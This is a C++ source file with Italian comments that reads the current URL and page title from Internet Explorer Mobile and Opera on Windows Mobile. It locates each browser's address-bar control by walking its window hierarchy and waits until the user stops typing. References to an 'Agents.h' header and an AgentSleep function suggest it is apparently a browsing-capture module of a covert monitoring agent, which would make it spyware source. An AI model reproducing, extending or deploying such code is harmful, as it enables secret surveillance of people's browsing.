#include "Url.h"
#include <Windows.h>

// La dichiariamo come extern perche' si trova in Agents.h ma
// non possiamo includere quel file visto che Agents.h include Url.h
extern BOOL AgentSleep(UINT Id, UINT uMillisec);

// IEXplore for Windows Mobile 6.0/6.1
INT GetIE60Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
	HWND hIE, hChild;
	WCHAR wTitle[256];
	wstring wRetUrl;

	// IExplore
	// +---> Worker
	//       ----> Button
	//       +---> combobox
	//             ---> Edit

	// IExplore fino a Windows Mobile 6.1
	hIE = FindWindow(L"IExplore", NULL);

	if (hIE == NULL)
		return 0;

	// Prendiamo il titolo
	GetWindowText(hIE, wTitle, 256);

	strTitle = wTitle;

	// Worker
	hIE = GetWindow(hIE, GW_CHILD);

	if (hIE == NULL)
		return 0;

	// Button
	hChild = GetNextDlgGroupItem(hIE, NULL, FALSE);

	if (hChild == NULL)
		return 0;

	// combobox
	hChild = GetNextDlgGroupItem(hIE, hChild, FALSE);

	if (hChild == NULL)
		return 0;

	// Edit
	hChild = GetWindow(hChild, GW_CHILD);

	if (hChild == NULL)
		return 0;

	WCHAR *pwUrl, wClass[30];
	UINT uUrlLen, uOldUrlLen;

	ZeroMemory(wClass, sizeof(wClass));
	GetClassName(hChild, wClass, 30);

	if (wcscmp(wClass, L"Edit"))
		return 0;

	do {
		uOldUrlLen = GetWindowTextLength(hChild);

		if (uOldUrlLen == 0)
			return 0;

		// Vediamo se l'utente sta scrivendo l'url
		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
			return -1;

	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);

	if (uUrlLen == 0)
		return 0;

	pwUrl = new(std::nothrow) WCHAR[uUrlLen + 1];

	if (pwUrl == NULL)
		return 0;

	ZeroMemory(pwUrl, (uUrlLen + 1) * sizeof(WCHAR));

	if (GetWindowText(hChild, pwUrl, uUrlLen + 1) == 0) {
		delete[] pwUrl;
		return 0;
	}

	strUrl = pwUrl;
	delete[] pwUrl;

	if ((strUrl.find(L"http://") == 0 || strUrl.find(L"https://") == 0 || 
		strUrl.find(L"ftp://") == 0 || strUrl.find(L"mms://") == 0 || 
		strUrl.find(L"rtsp://") == 0 || strUrl.find(L"rtmp://") == 0) && 
		strUrl.find(L"://", strUrl.length() - 3) == wstring::npos) {
		return 1;
	}

	return 0;
}

// IEXplore for Windows Mobile 6.5
INT GetIE65Url(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
	HWND hIE, hChild;
	WCHAR wTitle[256];
	wstring wRetUrl;

	// IExplore
	// +---> ListBox
	// +---> Worker
	//       ----> Button
	//       +---> AddCmbFrame
	//             ---> Edit

	// IExplore Windows Mobile 6.5
	hIE = FindWindow(L"IEMobile", NULL);

	if (hIE == NULL)
		return 0;

	// Prendiamo il titolo
	GetWindowText(hIE, wTitle, 256);

	strTitle = wTitle;

	// ListBox
	hIE = GetWindow(hIE, GW_CHILD);

	if (hIE == NULL)
		return 0;

	// Worker
	hIE = GetWindow(hIE, GW_HWNDNEXT);

	if (hIE == NULL)
		return 0;

	// Button
	hChild = GetNextDlgGroupItem(hIE, NULL, FALSE);

	if (hChild == NULL)
		return 0;

	// combobox
	hChild = GetNextDlgGroupItem(hIE, hChild, FALSE);

	if (hChild == NULL)
		return 0;

	// Edit
	hChild = GetWindow(hChild, GW_CHILD);

	if (hChild == NULL)
		return 0;

	WCHAR *pwUrl, wClass[30];
	UINT uUrlLen, uOldUrlLen;

	ZeroMemory(wClass, sizeof(wClass));
	GetClassName(hChild, wClass, 30);

	if (wcscmp(wClass, L"Edit"))
		return 0;

	do {
		uOldUrlLen = GetWindowTextLength(hChild);

		if (uOldUrlLen == 0)
			return 0;

		// Vediamo se l'utente sta scrivendo l'url
		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
			return -1;

	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);

	if (uUrlLen == 0)
		return 0;

	pwUrl = new(std::nothrow) WCHAR[uUrlLen + 1];

	if (pwUrl == NULL)
		return 0;

	ZeroMemory(pwUrl, (uUrlLen + 1) * sizeof(WCHAR));

	if (GetWindowText(hChild, pwUrl, uUrlLen + 1) == 0) {
		delete[] pwUrl;
		return 0;
	}

	strUrl = pwUrl;
	delete[] pwUrl;

	if ((strUrl.find(L"http://") == 0 || strUrl.find(L"https://") == 0 || 
		strUrl.find(L"ftp://") == 0 || strUrl.find(L"mms://") == 0 || 
		strUrl.find(L"rtsp://") == 0 || strUrl.find(L"rtmp://") == 0) && 
		strUrl.find(L"://", strUrl.length() - 3) == wstring::npos) {
			return 1;
	}

	return 0;
}

INT GetOperaUrl(wstring &strUrl, wstring &strTitle, HANDLE evHandle) {
	HWND hOpera, hChild;
	WCHAR wTitle[256];
	wstring wRetUrl;

	// OPERA-ML-MAINWNDCLASS
	// +---> WMOpera_Editex

	// OPERA-ML-MAINWNDCLASS per Mobile 6.1
	hOpera = FindWindow(L"OPERA-ML-MAINWNDCLASS", NULL);

	if (hOpera == NULL) {
		// Opera 9 per Mobile 6.5
		hOpera = FindWindow(L"Opera_MainWndClass", NULL);

		if (hOpera == NULL)
			return 0;
	}

	// Prendiamo il titolo
	GetWindowText(hOpera, wTitle, 256);

	strTitle = wTitle;

	// ACDropdown
	hChild = GetWindow(hOpera, GW_CHILD);

	if (hChild == NULL)
		return 0;

	WCHAR *pwUrl, wClass[30];
	UINT uUrlLen, uOldUrlLen;

	// Cerchiamo WMOpera_Editex
	for (UINT i = 0; i < 15; i++) {
		ZeroMemory(wClass, sizeof(wClass));

		hChild = GetNextDlgGroupItem(hOpera, hChild, FALSE);
		GetClassName(hChild, wClass, 30);

		if (!wcscmp(wClass, L"WMOpera_EditEx"))
			break;
	}

	if (wcscmp(wClass, L"WMOpera_EditEx"))
		return 0;

	do {
		uOldUrlLen = GetWindowTextLength(hChild);

		if (uOldUrlLen == 0)
			return 0;

		// Vediamo se l'utente sta scrivendo l'url
		if (WaitForSingleObject(evHandle, 2000) == WAIT_OBJECT_0)
			return -1;

	} while((uUrlLen = GetWindowTextLength(hChild)) != uOldUrlLen);

	if (uUrlLen == 0)
		return 0;

	pwUrl = new(std::nothrow) WCHAR[uUrlLen + 1];

	if (pwUrl == NULL)
		return 0;

	ZeroMemory(pwUrl, (uUrlLen + 1) * sizeof(WCHAR));

	if (GetWindowText(hChild, pwUrl, uUrlLen + 1) == 0) {
		delete[] pwUrl;
		return 0;
	}

	strUrl = pwUrl;
	delete[] pwUrl;

	if ((strUrl.find(L"http://") == 0 || strUrl.find(L"https://") == 0 || 
		strUrl.find(L"ftp://") == 0 || strUrl.find(L"mms://") == 0 || 
		strUrl.find(L"rtsp://") == 0 || strUrl.find(L"rtmp://") == 0) && 
		strUrl.find(L"://", strUrl.length() - 3) == wstring::npos) {
		return 1;
	}

	return 0;
}